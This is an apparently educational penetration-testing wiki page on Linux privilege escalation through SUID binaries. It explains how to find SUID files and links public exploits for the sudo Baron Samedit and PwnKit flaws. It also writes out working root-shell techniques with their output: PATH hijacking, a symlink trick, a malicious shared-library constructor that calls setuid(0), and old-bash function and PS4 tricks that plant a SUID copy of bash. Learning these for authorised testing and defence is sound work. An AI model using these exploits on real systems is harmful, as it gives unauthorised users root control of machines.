---
description: Binaries that execute with the permissions of the owner
---

# SUID

## Finding SUID binaries

Set User ID (SUID) binaries are programs that when executed by anyone, will do actions with the permissions of the owner of the program. All programs are files, and the SUID bit on a program is just a permission like read/write/execute that you might be familiar with. The SUID bit can be seen as an `s` character where there would normally be an `x` for executable permissions:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /usr/bin/sudo
</strong>-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
   ^  ^       ^     ^
SUID  SGID   user group
</code></pre>

When this `s` permission is set by the owner, it means that for anyone executing this program, it will be like the owner of the program ran it. If the file owner is root for example, then you would be executing the program as root. This sounds very dangerous because it is.&#x20;

{% hint style="info" %}
Note: The Set Group ID (SGID) bit is very similar. When executed by anyone, it just sets the permissions to those of the **group** owner of the file. The second name in the `ls` output is the group, so you can see what permissions you would be getting
{% endhint %}

As a defender, you need to be absolutely sure that the program that is executing cannot do things other users shouldn't be able to do, like reading files, writing files, or executing arbitrary commands. Programs like `sudo` in the example above are secured by asking for a password and checking permissions very carefully. But this is also why a vulnerability in sudo or any other SUID program is a big deal.&#x20;

To find all files on the system having the SUID or SGID bit set, you can use a `find` command:

```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

## Known Exploits

There are some common programs that require the SUID bit to work, like sudo. There is a lot of research into finding vulnerabilities in these programs specifically for Privilege Escalation. You can look up the version of a program with a term like "exploit" or "CVE" to find known exploits for it. [GitHub ](https://github.com/)and [ExploitDB](https://www.exploit-db.com/) are is great resources where Proof of Concepts are often shared, so make sure to search there if you know the program is vulnerable.&#x20;

Here are a few easily exploitable vulnerabilities in common outdated programs:

### Sudo < 1.9.5p2 (CVE-2021-3156)

The `sudoedit` program has a Heap-Based Buffer Overflow vulnerability. For all the technical details see [this writeup](https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31).&#x20;

A simple proof-of-concept script was quickly made in C that you likely need to compile on the target:

{% embed url="https://github.com/CptGibbon/CVE-2021-3156" %}
An exploit of Sudo Baron Samedit written in C
{% endembed %}

If compilers like `gcc` are not available on the target, you could try the Python version:

{% embed url="https://github.com/worawit/CVE-2021-3156" %}
A few versions of the Sudo Baron Samedit exploit written in Python
{% endembed %}

### PwnKit (CVE-2021-4034)

Polkit's `pkexec` program is another SUID binary. It had a vulnerability with the PATH variable allowing you to load an arbitrary shared library, and execute any code you want. For all the technical details see [this writeup](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034).

A proof-of-concept was made in C that you need to compile and run on the target:

{% embed url="https://github.com/arthepsy/CVE-2021-4034" %}
An exploit of PwnKit written in C
{% endembed %}

If compilers like `gcc` are not available on the target, you could try the Python version:

{% embed url="https://github.com/joeammond/CVE-2021-4034" %}
An exploit of PwnKit written in Python
{% endembed %}

## Environment Variables (PATH)

When a program is executed with SUID, the current environment variables are kept. This means you have even more control over the program's behavior by changing environment variables before executing it. One common trick is using the `PATH` variable, which has a `:` colon separated list of directories saying where to find programs without an absolute path. If the SUID program executes `service` for example instead of `/usr/sbin/service`, it will get the full path from the PATH variable.&#x20;

But since we can change the PATH environment variable before executing the program, we could append a directory of our own with another malicious program also named `service`. When then the `service` command is executed in the SUID binary, it will actually run the binary from our directory, allowing us to run arbitrary code.&#x20;

To find what commands are executed by an unknown program, you can try to use [#pspy](enumeration.md#pspy "mention") to find commands executed on the system. Another way would be to use [Broken link](broken-reference "mention") to find what the program exactly does.&#x20;

When you find a vulnerable command, you can simply make a program with the same name that gives you a shell:

{% code title="/tmp/service" %}
```bash
#!/bin/bash
bash
```
{% endcode %}

Then set the PATH variable before executing the vulnerable SUID program:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ PATH=/tmp:$PATH ./vulnerable
</strong># id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

### Replacing the command with a symlink

We can do this same tick, a bit quicker by using a Symbolic Link. We create a link that references `/bin/bash` so when our command gets called it goes to bash instead of the intended `service` command.d

```bash
ln -s /bin/bash /tmp/service
```

## Shared Object Injection

This technique is a little more advanced. Programs often need libraries to do certain things, but sometimes you can overwrite some of these libraries with your own. Then the SUID program would load your malicious library instead of the normal one, executing your code.&#x20;

You can find what libraries a program loads at runtime using `strace` and looking for opened files:

```c
$ strace ./vulnerable 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

In the example above, you can see a few libraries that it failed to access. The last one (libcalc.so) is in my user's home directory, so we can write our own library there for it to be executed:

{% code title="libcalc.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
{% endcode %}

{% code title="Compile to a shared library" %}
```shell-session
$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```
{% endcode %}

Then when the program loads `/home/user/.config/libcalc.so`, it will actually find our malicious library giving us a shell:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ./vulnerable
</strong># id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

## Old Bash Tricks

Bash is by far the most common shell, and has had a few updates to change certain features. In previous versions of bash, there were some tricks to exploit SUID binaries with functions and environment variables. To check the version of bash use:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /bin/bash --version
</strong>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
</code></pre>

### Bash < 4.2-048 (absolute path overwrite)

In these older bash versions, it was possible to define a function with the name of a full path to a program. This way, if you would specify the full path to that program, it would instead execute the function you defined with the same name. This makes it possible to overwrite absolute paths like `/usr/sbin/service` ran by SUID binaries, by defining a malicious function with the same name:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ function /usr/sbin/service { /bin/bash -p; }  # Define function to get a shell
</strong><strong>$ export -f /usr/sbin/service  # Export function
</strong><strong>$ ./vulnerable
</strong># id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

### Bash < 4.4 (PS4 variable)

When bash is in debug mode, it has the `PS4` variable which provides a custom prompt when a command is executed by the program. But the variable can run arbitrary commands with the `$()` command substitution syntax. You can set bash in debug mode with `SHELLOPTS=xtrace`, and then just set the `PS4` variable. Getting a direct shell with `/bin/bash -p` has some weird output, so I recommend just copying /bin/bash to another location and setting the SUID bit on it, so you can later run it for your root shell:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)' ./vulnerable
</strong><strong>$ /tmp/bash -p
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>
